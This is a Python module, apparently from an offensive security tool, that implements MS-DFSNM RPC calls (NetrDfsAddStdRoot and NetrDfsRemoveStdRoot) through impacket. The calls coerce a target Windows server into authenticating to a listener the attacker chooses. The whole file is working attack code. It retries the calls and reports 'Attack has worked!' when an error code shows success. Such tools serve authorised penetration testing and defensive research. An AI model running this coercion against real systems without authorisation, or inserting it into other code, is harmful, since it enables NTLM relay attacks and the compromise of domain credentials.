#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : MS_DFSNM.py
# Author             : Podalirius (@podalirius_)
# Date created       : 6 Jul 2022


import sys
import time
import random
from .RPCProtocol import RPCProtocol
from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import WSTR, DWORD


def gen_random_name(length=8):
    alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    name = ""
    for k in range(length):
        name += random.choice(alphabet)
    return name


class NetrDfsAddStdRoot(NDRCALL):
    opnum = 12
    structure = (
        ('ServerName', WSTR),  # Type: WCHAR *
        ('RootShare', WSTR),   # Type: WCHAR *
        ('Comment', WSTR),     # Type: WCHAR *
        ('ApiFlags', DWORD),   # Type: DWORD
    )


class NetrDfsAddStdRootResponse(NDRCALL):
    structure = ()


class NetrDfsRemoveStdRoot(NDRCALL):
    opnum = 13
    structure = (
        ('ServerName', WSTR),  # Type: WCHAR *
        ('RootShare', WSTR),   # Type: WCHAR *
        ('ApiFlags', DWORD)    # Type: DWORD
    )


class NetrDfsRemoveStdRootResponse(NDRCALL):
    structure = ()


class MS_DFSNM(RPCProtocol):
    name = "[MS-DFSNM]: Distributed File System (DFS): Namespace Management Protocol"
    shortname = "MS-DFSNM"
    uuid = "4fc742e0-4a10-11cf-8273-00aa004ae673"
    version = "3.0"
    available_pipes = [r"\PIPE\netdfs"]

    def NetrDfsRemoveStdRoot(self, listener, max_retries=3):
        # Microsoft docs: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/e9da023d-554a-49bc-837a-69f22d59fd18
        # Finding credits: @filip_dragovic
        call_name, call_opnum = "NetrDfsRemoveStdRoot", 13
        if self.dce is not None:
            tries = 0
            while tries <= max_retries:
                tries += 1
                print("      [>] On '\x1b[93m%s\x1b[0m' through '%s' targeting '\x1b[94m%s::%s\x1b[0m' (opnum %d) ... " % (self.target, self.pipe, self.shortname, call_name, call_opnum), end="")
                sys.stdout.flush()
                try:
                    request = NetrDfsRemoveStdRoot()
                    request['ServerName'] = '%s\x00' % listener
                    request['RootShare'] = gen_random_name() + '\x00'
                    request['ApiFlags'] = 0
                    if self.debug:
                        request.dump()
                    resp = self.dce.request(request)
                except Exception as e:
                    if "ERROR_INVALID_NAME" in str(e):
                        # SessionError: code: 0x7b - ERROR_INVALID_NAME - The filename, directory name, or volume label syntax is incorrect.
                        print("\x1b[1;91mERROR_INVALID_NAME\x1b[0m retrying in 20 seconds ...")
                        time.sleep(20)
                    elif "ERROR_BAD_NETPATH" in str(e):
                        # SessionError: code: 0x35 - ERROR_BAD_NETPATH - The network path was not found.
                        print("\x1b[1;92mERROR_BAD_NETPATH (Attack has worked!)\x1b[0m")
                        return True
                    elif "rpc_s_access_denied" in str(e):
                        # DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
                        print("\x1b[1;92mrpc_s_access_denied (Attack should have worked!)\x1b[0m")
                        return False
                    elif self.debug:
                        print("            [!]", e)
        else:
            if self.verbose:
                print("   [!] Error: dce is None, you must call connect() first.")

    def NetrDfsAddStdRoot(self, listener, max_retries=3):
        # Microsoft docs: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/b18ef17a-7a9c-4e22-b1bf-6a4d07e87b2d
        # Finding credits: @filip_dragovic
        call_name, call_opnum = "NetrDfsAddStdRoot", 12
        if self.dce is not None:
            tries = 0
            while tries <= max_retries:
                tries += 1
                print("      [>] On '\x1b[93m%s\x1b[0m' through '%s' targeting '\x1b[94m%s::%s\x1b[0m' (opnum %d) ... " % (self.target, self.pipe, self.shortname, call_name, call_opnum), end="")
                sys.stdout.flush()
                try:
                    request = NetrDfsAddStdRoot()
                    request['ServerName'] = '%s\x00' % listener
                    request['RootShare'] = gen_random_name() + '\x00'
                    request['Comment'] = gen_random_name() + '\x00'
                    request['ApiFlags'] = 0
                    if self.debug:
                        request.dump()
                    resp = self.dce.request(request)
                except Exception as e:
                    if "ERROR_INVALID_NAME" in str(e):
                        # SessionError: code: 0x7b - ERROR_INVALID_NAME - The filename, directory name, or volume label syntax is incorrect.
                        print("\x1b[1;91mERROR_INVALID_NAME\x1b[0m retrying in 20 seconds ...")
                        time.sleep(20)
                    elif "ERROR_BAD_NETPATH" in str(e):
                        # SessionError: code: 0x35 - ERROR_BAD_NETPATH - The network path was not found.
                        print("\x1b[1;92mERROR_BAD_NETPATH (Attack has worked!)\x1b[0m")
                        return True
                    elif "rpc_s_access_denied" in str(e):
                        # DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
                        print("\x1b[1;92mrpc_s_access_denied (Attack should have worked!)\x1b[0m")
                        return False
                    elif self.debug:
                        print("            [!]", e)
        else:
            if self.verbose:
                print("   [!] Error: dce is None, you must call connect() first.")


    @classmethod
    def list_coerce_methods(cls):
        return [
            ("NetrDfsAddStdRoot", 12, None),
            ("NetrDfsRemoveStdRoot", 13, None)
        ]

    def perform_coerce_calls(self, listener):
        self.NetrDfsAddStdRoot(listener)
        self.NetrDfsRemoveStdRoot(listener)
